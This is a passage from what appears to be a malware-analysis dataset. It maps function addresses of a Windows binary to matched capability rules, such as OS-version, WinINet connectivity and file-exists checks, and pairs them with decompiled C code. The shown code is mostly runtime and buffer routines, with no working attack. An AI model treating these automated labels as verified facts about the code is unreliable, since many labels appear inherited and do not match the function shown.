            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429e50(uint16_t *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x6af78) = 0;\n    if (*(in_ECX + 0x6af70) == 0) {\n        *(in_ECX + 0x6af78) = 1;\n        *(in_ECX + 0x6af70) = 0x10000;\n    }\n    *(in_ECX + 0x6af6c) = 0;\n    fcn.00434d30(in_ECX + 0x4af70, 0, 0x1fffc);\n    *(in_ECX + 0x6af98) = *(in_EAX * 8 + 0x44ca72);\n    *(in_ECX + 0x6af9c) = *(in_EAX * 8 + 0x44ca70);\n    *(in_ECX + 0x6afa0) = *(in_EAX * 8 + 0x44ca74);\n    *(in_ECX + 0x6af94) = *(in_EAX * 8 + 0x44ca76);\n    if (in_EAX < 3) {\n        *arg_8h = *arg_8h | 4;\n    }\n    else if (7 < in_EAX) {\n        *arg_8h = *arg_8h | 2;\n    }\n    *(in_ECX + 0x6af84) = 0;\n    *(in_ECX + 0x6af74) = 0;\n    uVar1 = (**(in_ECX + 0xc))();\n    *(in_ECX + 0x6af90) = uVar1;\n    if ((uVar1 != 0) && (uVar1 != 0xffffffff)) {\n        *(in_ECX + 0x6af8c) = 0;\n        if (uVar1 < 0x106) {\n            fcn.0042a0d0();\n        }\n        *(in_ECX + 0x6af7c) = 0;\n        *(in_ECX + 0x6af7c) = *(in_ECX + 0x1af70);\n        *(in_ECX + 0x6af7c) = *(in_ECX + 0x1af71) ^ *(in_ECX + 0x1af70) << 5;\n        return;\n    }\n    *(in_ECX + 0x6af90) = 0;\n    *(in_ECX + 0x6af8c) = 1;\n    return;\n}\n",
        "token_count": 609
    },
    "0042a0d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0042a0d0(void)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t unaff_ESI;\n    \n    while( true ) {\n        if ((((*(unaff_ESI + 0x6af70) - *(unaff_ESI + 0x6af84)) - *(unaff_ESI + 0x6af90) != -1) &&\n            (0xfef9 < *(unaff_ESI + 0x6af84))) && (*(unaff_ESI + 0x6af78) != 0)) {\n            fcn.0042f700(unaff_ESI + 0x1af70, unaff_ESI + 0x22f70, 0x8000);\n            *(unaff_ESI + 0x6af88) = *(unaff_ESI + 0x6af88) + -0x8000;\n            *(unaff_ESI + 0x6af84) = *(unaff_ESI + 0x6af84) + -0x8000;\n            *(unaff_ESI + 0x6af74) = *(unaff_ESI + 0x6af74) + -0x8000;\n            puVar1 = unaff_ESI + 0x4af70;\n            iVar2 = 0x8000;\n            do {\n                if (*puVar1 < 0x8000) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = *puVar1 - 0x8000;\n                }\n                *puVar1 = uVar3;\n                puVar1 = puVar1 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n            puVar1 = unaff_ESI + 0x2af70;\n            iVar2 = 0x8000;\n            do {\n                if (*puVar1 < 0x8000) {\n                    uVar3 = 0;\n                }\n                else {\n                    uVar3 = *puVar1 - 0x8000;\n                }\n                *puVar1 = uVar3;\n                puVar1 = puVar1 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        if (*(unaff_ESI + 0x6af8c) != 0) break;\n        iVar2 = (**(unaff_ESI + 0xc))();\n        if ((iVar2 == 0) || (iVar2 == -1)) {\n            *(unaff_ESI + 0x6af8c) = 1;\n        }\n        else {\n            *(unaff_ESI + 0x6af90) = *(unaff_ESI + 0x6af90) + iVar2;\n        }\n        if (0x105 < *(unaff_ESI + 0x6af90)) {\n            return;\n        }\n        if (*(unaff_ESI + 0x6af8c) != 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 693
    },
    "0042b5b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0042b5b0(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    int32_t unaff_EDI;\n    \n    if ((((*(unaff_ESI + 4) == 0) && (*(unaff_ESI + 0xc) == 0)) && (*(unaff_ESI + 0x20) == 0)) &&\n       (((*(unaff_ESI + 0x18) == 0 && (*(unaff_ESI + 0x14) == 0)) && (*(unaff_ESI + 0x2c) == '\\0')))) {\n        if (unaff_EDI == 0) {\n            return 0x30000;\n        }\n        iVar1 = (**0x4573a4)(0xffffffff, 0, 4, 0);\n        *(unaff_ESI + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            iVar1 = (**0x45751c)(iVar1, 0xf001f, 0, 0);\n            *(unaff_ESI + 0x20) = iVar1;\n            if (iVar1 != 0) {\n                *(unaff_ESI + 0x1c) = 1;\n                *(unaff_ESI + 0x24) = 0;\n                *(unaff_ESI + 0x28) = unaff_EDI;\n                return 0;\n            }\n            (**0x4573b8)(*(unaff_ESI + 0xc));\n            *(unaff_ESI + 0xc) = 0;\n        }\n        return 0x300;\n    }\n    return 0x1000000;\n}\n",
        "token_count": 375
    },
    "0042b670": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042b670(uint arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    uVar4 = arg_ch;\n    if (*(in_ECX + 0x2d) != '\\0') {\n        if ((*(in_ECX + 0x3c) != 0) && (*(in_ECX + 0x40) < arg_ch)) {\n            fcn.0042d62b(*(in_ECX + 0x3c));\n            *(in_ECX + 0x3c) = 0;\n        }\n        if (*(in_ECX + 0x3c) == 0) {\n            uVar2 = fcn.0042ddfe(uVar4 * 2);\n            *(in_ECX + 0x3c) = uVar2;\n            *(in_ECX + 0x40) = uVar4;\n        }\n        fcn.0042f700(*(in_ECX + 0x3c), arg_8h, uVar4);\n        uVar5 = 0;\n        if (uVar4 != 0) {\n            do {\n                uVar1 = *(uVar5 + *(in_ECX + 0x3c));\n                uVar4 = *(in_ECX + 0x38);\n                uVar3 = *(((uVar1 ^ *(in_ECX + 0x30)) & 0xff) * 4 + 0x44cac0) ^ *(in_ECX + 0x30) >> 8;\n                *(in_ECX + 0x30) = uVar3;\n                uVar3 = ((uVar3 & 0xff) + *(in_ECX + 0x34)) * 0x8088405 + 1;\n                *(in_ECX + 0x34) = uVar3;\n                *(in_ECX + 0x38) = uVar4 >> 8 ^ *(((uVar3 >> 0x18 ^ uVar4) & 0xff) * 4 + 0x44cac0);\n                uVar4 = uVar4 & 0xfffd | 2;\n                uVar3 = uVar5 + 1;\n                *(uVar5 + *(in_ECX + 0x3c)) = (uVar4 ^ 1) * uVar4 >> 8 ^ uVar1;\n                uVar5 = uVar3;\n                uVar4 = arg_ch;\n            } while (uVar3 < arg_ch);\n        }\n        arg_8h = *(in_ECX + 0x3c);\n    }\n    if (*(in_ECX + 0x20) == 0) {\n        if (*(in_ECX + 4) == 0) {\n            *(in_ECX + 0x14) = 0x1000000;\n            return 0;\n        }\n        (**0x457420)(*(in_ECX + 4), arg_8h, uVar4, &arg_ch, 0);\n        return arg_ch;\n    }\n    if (*(in_ECX + 0x24) + uVar4 < *(in_ECX + 0x28)) {\n        fcn.0042f700(*(in_ECX + 0x24) + *(in_ECX + 0x20), arg_8h, uVar4);\n        *(in_ECX + 0x24) = *(in_ECX + 0x24) + uVar4;\n        return uVar4;\n    }\n    *(in_ECX + 0x14) = 0x30000;\n    return 0;\n}\n",
        "token_count": 843
    },
    "0042b7d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042b7d0(uint param_1, uint32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x1c) == '\\0') {\n        *(in_EAX + 0x14) = 0x2000000;\n        return 0;\n    }\n    if (*(in_EAX + 0x20) != 0) {\n        if (*(in_EAX + 0x28) <= param_2) {\n            *(in_EAX + 0x14) = 0x30000;\n            return 0;\n        }\n        *(in_EAX + 0x24) = param_2;\n        return 1;\n    }\n    if (*(in_EAX + 4) != 0) {\n        (**0x4573d0)(*(in_EAX + 4), *(in_EAX + 0x10) + param_2, 0, 0);\n        return 1;\n    }\n    *(in_EAX + 0x14) = 0x1000000;\n    return 0;\n}\n",
        "token_count": 247
    },
    "0042bd50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0042bd50(void)\n\n{\n    int32_t unaff_ESI;\n    \n    if ((*(unaff_ESI + 0x80) != '\\0') && (*(unaff_ESI + 0x7c) != 0)) {\n        (**0x4573b8)(*(unaff_ESI + 0x7c));\n    }\n    *(unaff_ESI + 0x7c) = 0;\n    if ((*(unaff_ESI + 0x70) != -1) && (*(unaff_ESI + 0x70) != *(unaff_ESI + 0x74))) {\n        *(unaff_ESI + 0x70) = *(unaff_ESI + 0x74);\n        return 0x60000;\n    }\n    *(unaff_ESI + 0x70) = *(unaff_ESI + 0x74);\n    return 0;\n}\n",
        "token_count": 205
    },
    "0042c850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.0042c850(void)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar4 = *(in_EAX + 0x18);\n    var_8h = 0;\n    bVar1 = true;\n    iVar2 = *(in_EAX + 0x44);\n    while (iVar2 != 0) {\n        if ((bVar1) && (iVar3 = fcn.0042ab40(),  iVar3 != 0)) {\n            bVar1 = false;\n        }\n        var_8h = var_8h + 1;\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) + *(iVar2 + 0x24) + *(iVar2 + 0x20) + 0x2e + *(iVar2 + 0x18);\n        iVar3 = *(iVar2 + 0x35c);\n        if (*(iVar2 + 0x140) != 0) {\n            fcn.0042d62b(*(iVar2 + 0x140));\n        }\n        fcn.0042d62b(iVar2);\n        iVar2 = iVar3;\n    }\n    if (bVar1) {\n        iVar4 = fcn.0042af40(var_8h, *(in_EAX + 0x18) - iVar4);\n        if (iVar4 != 0) {\n            bVar1 = false;\n        }\n        *(in_EAX + 0x18) = *(in_EAX + 0x18) + 0x16;\n        if (bVar1) {\n            return 0;\n        }\n    }\n    return 0x400;\n}\n",
        "token_count": 430
    },
    "0042ca20": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ca20(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX == NULL) {\n        *0x457814 = 0x10000;\n        return;\n    }\n    if (*in_EAX != 2) {\n        *0x457814 = 0x80000;\n        return;\n    }\n    *0x457814 = fcn.0042bf30(arg_8h, 0, 2);\n    return;\n}\n",
        "token_count": 114
    },
    "0042ca60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042ca60(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint in_EDX;\n    \n    if (in_EAX == NULL) {\n        *0x457814 = 0x10000;\n        return;\n    }\n    if (*in_EAX != 2) {\n        *0x457814 = 0x80000;\n        return;\n    }\n    *0x457814 = fcn.0042bf30(in_EDX, arg_ch, 3);\n    return;\n}\n",
        "token_count": 123
    },
    "0042caa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0042caa0(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *unaff_EBX;\n    uint *unaff_EDI;\n    \n    if (in_EAX == NULL) {\n        if (unaff_EDI != NULL) {\n            *unaff_EDI = 0;\n        }\n        if (unaff_EBX != NULL) {\n            *unaff_EBX = 0;\n        }\n        *0x457814 = 0x10000;\n        return;\n    }\n    if (*in_EAX != 2) {\n        *0x457814 = 0x80000;\n        return;\n    }\n    iVar1 = in_EAX[1];\n    if (*(iVar1 + 0x2c) == '\\0') {\n        fcn.0042c850();\n    }\n    *(iVar1 + 0x2c) = 1;\n    if (unaff_EDI != NULL) {\n        *unaff_EDI = *(iVar1 + 0x20);\n    }\n    if (unaff_EBX != NULL) {\n        *unaff_EBX = *(iVar1 + 0x18);\n    }\n    *0x457814 = (-(*(iVar1 + 0x20) != 0) & 0xfffe0000) + 0x20000;\n    return;\n}\n",
        "token_count": 299
    },
    "0042d296": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0042d296(uint arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t arg_8h_00;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = arg_ch & 4;\n    uVar2 = arg_ch & 0x80;\n    uVar1 = 1;\n    if ((arg_ch & 0x40) != 0) {\n        arg_ch = arg_ch | 1;\n    }\n    if ((arg_ch & 8) != 0) {\n        arg_ch = arg_ch | 2;\n    }\n    iVar4 = 0;\n    do {\n        if (uVar1 == (arg_ch & 0xffffff3b)) break;\n        uVar1 = *(iVar4 * 4 + 0x444390);\n        iVar4 = iVar4 + 1;\n    } while (uVar1 != 0);\n    if (*(iVar4 * 4 + 0x44438c) != 0) {\n        if (((uVar2 == 0) || ((arg_ch & 10) == 0)) || (arg_8h_00 = fcn.0042d1cf(arg_8h, 0, arg_10h),  arg_8h_00 == 0)) {\n            arg_8h_00 = fcn.0042d1cf(arg_8h, iVar4, arg_10h);\n            if (arg_8h_00 == 0) {\n                return 0;\n            }\n            if (uVar3 == 0) {\n                return arg_8h_00;\n            }\n            iVar4 = fcn.00430da0(arg_8h_00, 0, 2);\n            if (iVar4 == 0) {\n                return arg_8h_00;\n            }\n        }\n        fcn.0042f172(arg_8h_00);\n    }\n    return 0;\n}\n",
        "token_count": 456
    },
    "0042d696": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d696(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x45602c, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.00431723();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.004316e1(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0042d636": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042d636(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x454664) {\n        return;\n    }\n    *0x455e18 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x455e1c = &arg_8h;\n    *0x455d58 = 0x10001;\n    *0x455d00 = 0xc0000409;\n    *0x455d04 = 1;\n    var_328h = *0x454664;\n    var_324h = *0x454668;\n    *0x455d0c = unaff_retaddr;\n    *0x455de4 = in_GS;\n    *0x455de8 = in_FS;\n    *0x455dec = in_ES;\n    *0x455df0 = in_DS;\n    *0x455df4 = unaff_EDI;\n    *0x455df8 = unaff_ESI;\n    *0x455dfc = unaff_EBX;\n    *0x455e00 = in_EDX;\n    *0x455e04 = in_ECX;\n    *0x455e08 = in_EAX;\n    *0x455e0c = unaff_EBP;\n    *0x455e10 = unaff_retaddr;\n    *0x455e14 = in_CS;\n    *0x455e20 = in_SS;\n    *0x455d50 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0043b605(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x4452b0);\n    if (*0x455d50 == 0) {\n        fcn.0043b605(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 826
    },
    "0042fb57": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0042fb57(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x42fc02;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0042fc2e;\n        uStack36 = *0x454664 ^ &fcn.0042fb57::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0042fb57::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0043493b();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.0042fb57::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 723
    },
    "0043184c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0043184c(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x450c50, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar4 = fcn.0043493b();\n    *(iVar4 + 0x90) = *(iVar4 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.00437717();\n        }\n        iVar4 = *(iVar1 + 8);\n        iVar3 = *(iVar4 + iVar5 * 8);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar4 + 4 + iVar5 * 8) != 0) {\n            *(iVar2 + 8) = iVar3;\n            fcn.00437760(*(*(iVar1 + 8) + 4 + iVar5 * 8), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar5 = iVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0043190e();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.00437717();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.00435185();\n    return;\n}\n",
        "token_count": 566
    },
    "0043190e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0043190e(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0043493b();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0043493b();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "004328f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x004329ff: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00432a04)\n// WARNING: Removing unreachable block (ram,0x00432a33)\n// WARNING: Removing unreachable block (ram,0x00432a0a)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004328f9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00435140(0x450db0, 0x20);\n    fcn.004357b0(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x456060 != 1) {\n        *0x45605c = 1;\n        *0x456058 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x46816c);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x468168);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.0043478b();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.0043478b();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x46816c);\n                        piVar2 = (*pcVar1)(*0x468168);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x4441e4;\n            while (*(unaff_EBP + -0x1c) < 0x4441f0) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x4441f4;\n        while (*(unaff_EBP + -0x20) < 0x4441f8) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004356d7(8);\n    }\n    return;\n}\n",
        "token_count": 1014
    },
    "0043b534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
